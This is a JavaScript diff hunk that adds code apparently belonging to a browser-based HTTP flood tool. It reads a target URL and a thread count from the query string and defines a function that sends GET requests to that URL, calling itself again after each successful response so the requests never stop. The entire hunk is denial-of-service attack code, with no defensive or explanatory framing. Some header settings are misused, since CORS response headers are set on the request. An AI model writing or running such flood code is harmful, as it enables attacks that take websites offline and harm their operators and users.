@@ -198,3 +198,28 @@ function getQueryVariable(variable)
 var url = getQueryVariable('url');
 var threads = getQueryVariable('threads');
 var uaHead = generateUA();
+
+sendPacket(url);
+
+function sendPacket(url)
+{
+    var request = new XMLHttpRequest();
+    request.open('GET', url);
+    request.setRequestHeader("Access-Control-Allow-Origin", "*");
+    request.setRequestHeader("Access-Control-Allow-Methods", "GET, POST, PATCH, PUT, DELETE, OPTIONS");
+    request.setRequestHeader("Access-Control-Allow-Headers", "Origin, Content-Type, X-Auth-Token");
+
+    request.onreadystatechange = function()
+    {
+        if (this.readyState == 4 && this.status == 200)
+        {
+            console.log("[INFO] SENDED Packet")
+            sendPacket(url);
+        }
+        else
+        {
+            console.log("[ERROR] Failed Packet")
+        }
+    }
+    request.send();
+}
